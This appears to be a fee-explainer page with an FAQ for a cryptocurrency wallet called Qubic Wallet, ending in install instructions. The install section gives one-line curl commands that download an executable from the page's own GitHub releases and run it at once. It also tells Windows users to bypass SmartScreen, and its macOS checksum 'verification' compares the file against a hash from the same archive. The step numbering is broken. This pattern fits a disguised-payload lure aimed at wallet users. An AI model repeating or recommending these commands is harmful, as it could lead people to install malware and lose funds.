> The wallet takes no cut. Everything you pay is either the network or the venue.

Qubic Wallet does not charge a fee for holding an account or for opening the app. What you pay appears in three places: the network cost of a transfer, the venue cost of a trade on QX, and whatever an exchange charges when funds pass through it. The app shows the amount before you confirm, which is the only figure worth trusting over a general statement about fees.

## Sending: the network cost

A transfer consumes network resources, and the app presents the result of that before submission. The exact figure belongs to the network at the time you send rather than to this page, and it changes with network conditions.

What does not change: there is no wallet-side percentage, no withdrawal fee and no monthly cost. If a screen asks for a payment to unlock an account, it is not this product.

## Trading: the venue cost

QX is a trading venue inside the wallet, not a broker. Orders placed there carry the venue's own rules, and the app shows them as part of the order flow rather than as a wallet charge.

The <a href="https://github.com/qubic-wallet/qubic-wallet-features/blob/main/qubic-wallet-qx-trading-orderbook.md">QX trading walkthrough</a> covers what the order book and the order types mean.

## Exchange transfers

An exchange deposit or withdrawal carries the exchange's fee plus the network cost, and neither is set by the wallet. That is why the same transfer can cost different amounts on two days: the venue changed its schedule, not the app.

## Where to read the number

The confirmation step before a send is the authoritative number for that send, and it is the only figure that accounts for the current network state. Compare it against what you expected rather than against a blog post, including this one.

To see the flow that produces it, the <a href="https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-send-qu-tokens.md">send walkthrough</a> follows a transfer from amount to confirmation.

Do it on the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a> so the figures you see are the current ones.

## FAQ

### Does Qubic Wallet charge a fee?

No wallet fee is applied to holding an account or to transfers. Network and venue costs are separate.

### Why did the same transfer cost more than last time?

Network conditions changed, or the venue's schedule did. The amount shown before confirmation is the one that applies.

### Are there fees for receiving?

Not from the wallet. An exchange may charge to credit a deposit.

### Do I pay to hold QU?

No. There is no custody or account fee.

### Where is the fee shown?

At the confirmation step of the send, before anything is submitted.

## How to install Qubic Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.

5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
